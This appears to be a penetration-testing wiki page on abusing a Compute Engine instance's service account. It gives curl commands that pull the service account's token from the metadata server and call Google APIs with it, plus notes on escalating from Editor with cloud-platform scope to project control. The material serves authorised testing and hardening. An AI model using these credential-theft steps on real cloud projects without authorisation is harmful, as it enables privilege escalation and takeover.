---
title: "Service account scope: calling APIs as the instance"
description: "Abusing a Compute Engine instance's attached service account and OAuth scopes to call Google APIs with its privileges."
keywords:
  - service account scope
  - OAuth scope
  - instance service account
  - cloud-platform
  - GCE
---

# Service account scope

A Compute Engine instance runs as a service account, and what that token can do is the intersection of two things: the **IAM roles** granted to the service account, and the **OAuth scopes** set on the instance. Legacy instances often carry the default service account (frequently **Editor**) and the `cloud-platform` scope, which together make a shell on the box equivalent to project-wide write.

## Reading the identity and scopes

```bash
# from a shell on the instance
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

## Using the token

```bash
TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token)
# call any API the SA roles + scope allow
curl -s -H "Authorization: Bearer $TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects/<project>:getIamPolicy -X POST
```

If gcloud is present, `gcloud auth list` shows the active instance SA and subsequent `gcloud` calls use it directly.

## Exploitation notes

- Scopes cap the token regardless of IAM: a `storage-ro` scope blocks writes even if the SA is Editor; `cloud-platform` removes the cap entirely, so check scopes first.
- The default Compute Engine service account with Editor is the single most common GCP foothold-to-project-control jump; enumerate its bindings from the token.
- From the SA you reach the broader [impersonation](../../identity/service-account-impersonation/index.md) and [actAs](../../identity/privilege-escalation/index.md) paths if it holds the right permissions.

## Tools

- **gcloud** (`auth list`, then normal commands run as the SA).
- **curl** against the metadata server.

## References

- [Rhino Security Labs: GCP privilege escalation (part 1)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Hacking the Cloud: GCP metadata](https://hackingthe.cloud/)
- [Google: service accounts and scopes](https://cloud.google.com/compute/docs/access/service-accounts)
